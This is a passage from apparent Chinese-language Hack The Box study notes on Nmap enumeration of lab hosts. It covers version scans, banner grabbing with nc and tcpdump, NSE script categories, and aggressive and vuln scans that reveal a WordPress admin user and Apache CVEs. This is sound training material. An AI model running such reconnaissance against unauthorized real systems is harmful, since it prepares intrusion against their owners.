\u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>--stats-every=5s</code> \u6bcf 5 \u79d2\u663e\u793a\u4e00\u6b21\u626b\u63cf\u8fdb\u5ea6\u3002 <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u589e\u52a0<code>verbosity level</code>\uff08<code>-v</code>/ <code>-vv</code>\uff09\uff0c\u8fd9\u6837\u5728\u68c0\u6d4b\u5230\u7aef\u53e3\u65f6\u4f1a\u76f4\u63a5\u663e\u793a\u7ed9\u6211\u4eec\u6253\u5f00\u7684\u7aef\u53e3<code>Nmap</code>\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -v \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:03 CEST\nNSE: Loaded 45 scripts for scanning.\nInitiating ARP Ping Scan at 20:03\nScanning 10.129.2.28 [1 port]\nCompleted ARP Ping Scan at 20:03, 0.03s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:03\nCompleted Parallel DNS resolution of 1 host. at 20:03, 0.02s elapsed\nInitiating SYN Stealth Scan at 20:03\nScanning 10.129.2.28 [65535 ports]\nDiscovered open port 995/tcp on 10.129.2.28\nDiscovered open port 80/tcp on 10.129.2.28\nDiscovered open port 993/tcp on 10.129.2.28\nDiscovered open port 143/tcp on 10.129.2.28\nDiscovered open port 25/tcp on 10.129.2.28\nDiscovered open port 110/tcp on 10.129.2.28\nDiscovered open port 22/tcp on 10.129.2.28\n&lt;SNIP&gt;\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>-v</code> \u589e\u52a0\u626b\u63cf\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u663e\u793a\u66f4\u8be6\u7ec6\u7684\u4fe1\u606f\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_20","title":"\u6a2a\u5e45\u6293\u53d6","text":"<p>\u626b\u63cf\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5c06\u770b\u5230\u6240\u6709\u5177\u6709\u76f8\u5e94\u670d\u52a1\u7684 TCP \u7aef\u53e3\u53ca\u5176\u5728\u7cfb\u7edf\u4e0a\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u7248\u672c\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:00 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\nNot shown: 65525 closed ports\nPORT      STATE    SERVICE      VERSION\n22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n25/tcp    open     smtp         Postfix smtpd\n80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))\n110/tcp   open     pop3         Dovecot pop3d\n139/tcp   filtered netbios-ssn\n143/tcp   open     imap         Dovecot imapd (Ubuntu)\n445/tcp   filtered microsoft-ds\n993/tcp   open     ssl/imap     Dovecot imapd (Ubuntu)\n995/tcp   open     ssl/pop3     Dovecot pop3d\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 91.73 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <p>\u9996\u5148\uff0c<code>Nmap</code>\u67e5\u770b\u626b\u63cf\u7aef\u53e3\u7684\u6a2a\u5e45\u5e76\u5c06\u5176\u6253\u5370\u51fa\u6765\u3002\u5982\u679c\u5b83\u65e0\u6cd5\u901a\u8fc7\u6a2a\u5e45\u8bc6\u522b\u7248\u672c\uff0c<code>Nmap</code>\u5219\u4f1a\u5c1d\u8bd5\u901a\u8fc7\u57fa\u4e8e\u7b7e\u540d\u7684\u5339\u914d\u7cfb\u7edf\u6765\u8bc6\u522b\u5b83\u4eec\uff0c\u4f46\u8fd9\u4f1a\u663e\u7740\u589e\u52a0\u626b\u63cf\u7684\u6301\u7eed\u65f6\u95f4\u3002<code>Nmap</code>\u663e\u793a\u7ed3\u679c\u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u81ea\u52a8\u626b\u63cf\u53ef\u80fd\u4f1a\u9057\u6f0f\u4e00\u4e9b\u4fe1\u606f\uff0c\u56e0\u4e3a\u6709\u65f6<code>Nmap</code>\u4e0d\u77e5\u9053\u5982\u4f55\u5904\u7406\u5b83\u3002\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u8fd9\u6837\u7684\u4f8b\u5b50\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 20:10 CEST\n&lt;SNIP&gt;\nNSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..\nService scan match (Probe NULL matched with NULL line 3104): 10.129.2.28:25 is smtp.  Version: |Postfix smtpd|||\nNSOCK INFO [0.4200s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up (0.076s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <p>\u5982\u679c\u6211\u4eec\u67e5\u770b \u7684\u7ed3\u679c<code>Nmap</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7aef\u53e3\u7684\u72b6\u6001\u3001\u670d\u52a1\u540d\u79f0\u548c\u4e3b\u673a\u540d\u3002\u4e0d\u8fc7\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u91cc\u7684\u8fd9\u4e00\u884c\uff1a</p> <ul> <li><code>NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..</code></li> </ul> <p>\u7136\u540e\u6211\u4eec\u770b\u5230\u6211\u4eec\u76ee\u6807\u4e0a\u7684 SMTP \u670d\u52a1\u5668\u7ed9\u4e86\u6211\u4eec\u6bd4<code>Nmap</code>\u663e\u793a\u7ed9\u6211\u4eec\u66f4\u591a\u7684\u4fe1\u606f\u3002\u56e0\u4e3a\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u770b\u5230\u7684\u662f Linux \u53d1\u884c\u7248<code>Ubuntu</code>\u3002\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u662f\u56e0\u4e3a\uff0c\u5728\u6210\u529f\u7684\u4e09\u6b21\u63e1\u624b\u4e4b\u540e\uff0c\u670d\u52a1\u5668\u901a\u5e38\u4f1a\u53d1\u9001\u4e00\u4e2a\u6807\u8bed\u4ee5\u4f9b\u8bc6\u522b\u3002\u8fd9\u7528\u4e8e\u8ba9\u5ba2\u6237\u7aef\u77e5\u9053\u5b83\u6b63\u5728\u4f7f\u7528\u54ea\u4e2a\u670d\u52a1\u3002\u5728\u7f51\u7edc\u7ea7\u522b\uff0c\u8fd9\u53d1\u751f<code>PSH</code>\u5728 TCP \u6807\u5934\u4e2d\u7684\u6807\u5fd7\u3002\u4f46\u662f\uff0c\u67d0\u4e9b\u670d\u52a1\u53ef\u80fd\u4e0d\u4f1a\u7acb\u5373\u63d0\u4f9b\u6b64\u7c7b\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u4ece\u76f8\u5e94\u670d\u52a1\u4e2d\u5220\u9664\u6216\u64cd\u7eb5\u6a2a\u5e45\u3002\u5982\u679c\u6211\u4eec<code>manually</code>\u4f7f\u7528 \u8fde\u63a5\u5230 SMTP \u670d\u52a1\u5668<code>nc</code>\uff0c\u6293\u53d6\u6a2a\u5e45\u5e76\u4f7f\u7528 \u62e6\u622a\u7f51\u7edc\u6d41\u91cf<code>tcpdump</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230<code>Nmap</code>\u6ca1\u6709\u663e\u793a\u7ed9\u6211\u4eec\u7684\u5185\u5bb9\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_21","title":"\u8f6c\u50a8","text":"<p>\u8f6c\u50a8</p> <pre><code>darkinga@htb[/htb]$ sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28\n\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_22","title":"\u6570\u63a7","text":"<p>\u6570\u63a7</p> <pre><code>darkinga@htb[/htb]$  nc -nv 10.129.2.28 25\n\nConnection to 10.129.2.28 port 25 [tcp/*] succeeded!\n220 inlane ESMTP Postfix (Ubuntu)\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcpdump-","title":"Tcpdump - \u62e6\u622a\u7684\u6d41\u91cf","text":"<p>Tcpdump - \u62e6\u622a\u7684\u6d41\u91cf</p> <pre><code>18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], seq 1798872233, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 331260178 ecr 0,sackOK,eol], length 0\n18:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], seq 1130574379, ack 1798872234, win 65160, options [mss 1460,sackOK,TS val 1800383922 ecr 331260178,nop,wscale 7], length 0\n18:28:07.255281 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 1, win 2058, options [nop,nop,TS val 331260304 ecr 1800383922], length 0\n18:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], seq 1:36, ack 1, win 510, options [nop,nop,TS val 1800383985 ecr 331260304], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)\n18:28:07.319426 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 36, win 2058, options [nop,nop,TS val 331260368 ecr 1800383985], length 0\n</code></pre> <p>\u524d\u4e09\u884c\u5411\u6211\u4eec\u5c55\u793a\u4e86\u4e09\u6b21\u63e1\u624b\u3002</p> 1. <code>[SYN]</code> <code>18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], &lt;SNIP&gt;</code> 2. <code>[SYN-ACK]</code> <code>18:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], &lt;SNIP&gt;</code> 3. <code>[ACK]</code> <code>18:28:07.255281 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], &lt;SNIP&gt;</code> <p>\u4e4b\u540e\uff0c\u76ee\u6807 SMTP \u670d\u52a1\u5668\u5411\u6211\u4eec\u53d1\u9001\u4e00\u4e2a\u5e26\u6709<code>PSH</code>\u548c<code>ACK</code>\u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\uff0c\u5176\u4e2d<code>PSH</code>\u58f0\u660e\u76ee\u6807\u670d\u52a1\u5668\u6b63\u5728\u5411\u6211\u4eec\u53d1\u9001\u6570\u636e\uff0c\u540c\u65f6<code>ACK</code>\u901a\u77e5\u6211\u4eec\u6240\u6709\u9700\u8981\u7684\u6570\u636e\u5df2\u53d1\u9001\u3002</p> 4. <code>[PSH-ACK]</code> <code>18:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], &lt;SNIP&gt;</code> <p>\u6211\u4eec\u53d1\u9001\u7684\u6700\u540e\u4e00\u4e2a TCP \u6570\u636e\u5305\u4ee5<code>ACK</code>.</p> 5. <code>[ACK]</code> <code>18:28:07.319426 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], &lt;SNIP&gt;</code>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_3","title":"Nmap \u811a\u672c\u5f15\u64ce","text":"<p>Nmap \u811a\u672c\u5f15\u64ce ( <code>NSE</code>) \u662f<code>Nmap</code>. \u5b83\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5728 Lua \u4e2d\u521b\u5efa\u811a\u672c\u4ee5\u4e0e\u67d0\u4e9b\u670d\u52a1\u4ea4\u4e92\u7684\u53ef\u80fd\u6027\u3002\u8fd9\u4e9b\u811a\u672c\u603b\u5171\u53ef\u4ee5\u5206\u4e3a 14 \u7c7b\uff1a</p> \u7c7b\u522b \u63cf\u8ff0 <code>auth</code> \u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u7684\u786e\u5b9a\u3002 <code>broadcast</code> \u7528\u4e8e\u901a\u8fc7\u5e7f\u64ad\u53d1\u73b0\u4e3b\u673a\u7684\u811a\u672c\u548c\u53d1\u73b0\u7684\u4e3b\u673a\u53ef\u4ee5\u81ea\u52a8\u6dfb\u52a0\u5230\u5269\u4f59\u7684\u626b\u63cf\u4e2d\u3002 <code>brute</code> \u6267\u884c\u5c1d\u8bd5\u901a\u8fc7\u4f7f\u7528\u51ed\u636e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u6765\u767b\u5f55\u76f8\u5e94\u670d\u52a1\u7684\u811a\u672c\u3002 <code>default</code> \u4f7f\u7528\u8be5<code>-sC</code>\u9009\u9879\u6267\u884c\u7684\u9ed8\u8ba4\u811a\u672c\u3002 <code>discovery</code> \u8bc4\u4f30\u65e0\u969c\u788d\u670d\u52a1\u3002 <code>dos</code> \u8fd9\u4e9b\u811a\u672c\u7528\u4e8e\u68c0\u67e5\u670d\u52a1\u662f\u5426\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u5e76\u4e14\u7531\u4e8e\u4f1a\u635f\u5bb3\u670d\u52a1\u800c\u8f83\u5c11\u4f7f\u7528\u3002 <code>exploit</code> \u6b64\u7c7b\u811a\u672c\u4f1a\u5c1d\u8bd5\u5229\u7528\u626b\u63cf\u7aef\u53e3\u7684\u5df2\u77e5\u6f0f\u6d1e\u3002 <code>external</code> \u4f7f\u7528\u5916\u90e8\u670d\u52a1\u8fdb\u884c\u8fdb\u4e00\u6b65\u5904\u7406\u7684\u811a\u672c\u3002 <code>fuzzer</code> \u8fd9\u4f7f\u7528\u811a\u672c\u901a\u8fc7\u53d1\u9001\u4e0d\u540c\u7684\u5b57\u6bb5\u6765\u8bc6\u522b\u6f0f\u6d1e\u548c\u610f\u5916\u6570\u636e\u5305\u5904\u7406\uff0c\u8fd9\u53ef\u80fd\u4f1a\u82b1\u8d39\u5f88\u591a\u65f6\u95f4\u3002 <code>intrusive</code> \u53ef\u80fd\u5bf9\u76ee\u6807\u7cfb\u7edf\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\u7684\u4fb5\u5165\u6027\u811a\u672c\u3002 <code>malware</code> \u68c0\u67e5\u67d0\u4e9b\u6076\u610f\u8f6f\u4ef6\u662f\u5426\u611f\u67d3\u4e86\u76ee\u6807\u7cfb\u7edf\u3002 <code>safe</code> \u4e0d\u6267\u884c\u4fb5\u5165\u6027\u548c\u7834\u574f\u6027\u8bbf\u95ee\u7684\u9632\u5fa1\u811a\u672c\u3002 <code>version</code> \u670d\u52a1\u68c0\u6d4b\u6269\u5c55\u3002 <code>vuln</code> \u7279\u5b9a\u6f0f\u6d1e\u7684\u8bc6\u522b\u3002 <p>\u6211\u4eec\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5728<code>Nmap</code>.</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_23","title":"\u9ed8\u8ba4\u811a\u672c","text":"<p>\u9ed8\u8ba4\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; -sC\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_24","title":"\u7279\u5b9a\u811a\u672c\u7c7b\u522b","text":"<p>\u7279\u5b9a\u811a\u672c\u7c7b\u522b</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;category&gt;\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_25","title":"\u5b9a\u4e49\u811a\u672c","text":"<p>\u5b9a\u4e49\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...\n</code></pre> <p>\u4f8b\u5982\uff0c\u8ba9\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u76ee\u6807 SMTP \u7aef\u53e3\u5e76\u67e5\u770b\u6211\u4eec\u4f7f\u7528\u4e24\u4e2a\u5b9a\u4e49\u7684\u811a\u672c\u83b7\u5f97\u7684\u7ed3\u679c\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_1","title":"Nmap - \u6307\u5b9a\u811a\u672c","text":"<p>Nmap - \u6307\u5b9a\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 23:21 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.050s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_banner: 220 inlane ESMTP Postfix (Ubuntu)\n|_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--script banner,smtp-commands</code> \u4f7f\u7528\u6307\u5b9a\u7684 NSE \u811a\u672c\u3002 <p>\u6211\u4eec\u770b\u5230\u4f7f\u7528'banner'\u811a\u672c\u53ef\u4ee5\u8bc6\u522bLinux\u7684Ubuntu\u53d1\u884c\u7248\u3002\u8be5<code>smtp-commands</code>\u811a\u672c\u5411\u6211\u4eec\u5c55\u793a\u4e86\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0e\u76ee\u6807 SMTP \u670d\u52a1\u5668\u4ea4\u4e92\u6765\u4f7f\u7528\u54ea\u4e9b\u547d\u4ee4\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u6b64\u7c7b\u4fe1\u606f\u53ef\u80fd\u4f1a\u5e2e\u52a9\u6211\u4eec\u627e\u51fa\u76ee\u6807\u4e0a\u7684\u73b0\u6709\u7528\u6237\u3002<code>Nmap</code>\u8fd8\u4f7f\u6211\u4eec\u80fd\u591f\u4f7f\u7528\u653b\u51fb\u6027\u9009\u9879 ( <code>-A</code>) \u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\u3002\u8fd9\u4f1a\u4f7f\u7528\u591a\u4e2a\u9009\u9879\u626b\u63cf\u76ee\u6807\uff0c\u5982\u670d\u52a1\u68c0\u6d4b ( <code>-sV</code>)\u3001\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b ( <code>-O</code>)\u3001\u8ddf\u8e2a\u8def\u7531 ( <code>--traceroute</code>) \u548c\u9ed8\u8ba4 NSE \u811a\u672c ( <code>-sC</code>)\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_2","title":"Nmap - \u653b\u51fb\u6027\u626b\u63cf","text":"<p>Nmap - \u653b\u51fb\u6027\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -A\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:38 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.012s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: WordPress 5.3.4\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: blog.inlanefreight.com\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), \nAXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), \nLinux 2.6.32 - 2.6.35 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT      ADDRESS\n1   11.91 ms 10.129.2.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.36 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-A</code> \u6267\u884c\u670d\u52a1\u68c0\u6d4b\u3001\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u3001\u8def\u7531\u8ddf\u8e2a\u5e76\u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u626b\u63cf\u76ee\u6807\u3002 <p>\u501f\u52a9\u4f7f\u7528\u7684\u626b\u63cf\u9009\u9879 ( )\uff0c\u6211\u4eec\u627e\u51fa\u4e86\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u662f<code>-A</code>\u54ea\u79cd Web \u670d\u52a1\u5668 ( )\uff0c\u4f7f\u7528\u4e86\u54ea\u4e2a Web \u5e94\u7528\u7a0b\u5e8f ( )\uff0c\u4ee5\u53ca\u7f51\u9875\u7684\u6807\u9898 ( )\u3002\u6b64\u5916\uff0c\u8868\u660e\u5b83\u5f88\u53ef\u80fd\u662f( ) \u64cd\u4f5c\u7cfb\u7edf\u3002<code>Apache 2.4.29``WordPress 5.3.4``blog.inlanefreight.com``Nmap``Linux``96%</code></p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_26","title":"\u6f0f\u6d1e\u8bc4\u4f30","text":"<p>\u73b0\u5728\u8ba9\u6211\u4eec\u8f6c\u5230 HTTP \u7aef\u53e3 80\uff0c\u770b\u770b\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>vuln</code>\u6765\u81ea\u7684\u7c7b\u522b\u627e\u5230\u54ea\u4e9b\u4fe1\u606f\u548c\u6f0f\u6d1e<code>NSE</code>\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_3","title":"Nmap - \u6f0f\u6d1e\u7c7b\u522b","text":"<p>Nmap - \u6f0f\u6d1e\u7c7b\u522b</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln \n\nNmap scan report for 10.129.2.28\nHost is up (0.036s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-enum:\n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2\n|   /: WordPress version: 5.3.4\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-wordpress-users:\n| Username found: admin\n|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'\n| vulners:\n|   cpe:/a:apache:http_server:2.4.29:\n|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211\n|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312\n|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715\n&lt;SNIP&gt;\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 80</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>--script vuln</code> \u4f7f\u7528\u6307\u5b9a\u7c7b\u522b\u4e2d\u7684\u6240\u6709\u76f8\u5173\u811a\u672c\u3002 <p>\u7528\u4e8e\u4e0a\u6b21\u626b\u63cf\u7684\u811a\u672c\u4e0e\u7f51\u7edc\u670d\u52a1\u5668\u53ca\u5176\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\uff0c\u4ee5\u67e5\u627e\u6709\u5173\u5176\u7248\u672c\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u5e76\u68c0\u67e5\u5404\u79cd\u6570\u636e\u5e93\u4ee5\u67e5\u770b\u662f\u5426\u5b58\u5728\u5df2\u77e5\u6f0f\u6d1e\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u627e\u5230\u6709\u5173 NSE \u811a\u672c\u548c\u76f8\u5e94\u7c7b\u522b\u7684\u66f4\u591a\u4fe1\u606f\uff1a https: //nmap.org/nsedoc/index.html</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_27","title":"\u8868\u73b0","text":"<p>\u5f53\u6211\u4eec\u9700\u8981\u626b\u63cf\u5e7f\u6cdb\u7684\u7f51\u7edc\u6216\u5904\u7406\u4f4e\u7f51\u7edc\u5e26\u5bbd\u65f6\uff0c\u626b\u63cf\u6027\u80fd\u8d77\u7740\u91cd\u8981\u4f5c\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u9009\u9879\u6765\u5224\u65ad\u6d4b\u8bd5\u6570\u636e\u5305\u5e94\u8be5<code>Nmap</code>\u6709\u591a\u5feb ( <code>-T &lt;1-5&gt;</code>)\u3001\u9891\u7387 ( <code>--min-parallelism &lt;number&gt;</code>)\u3001\u8d85\u65f6 ( <code>--max-rtt-timeout 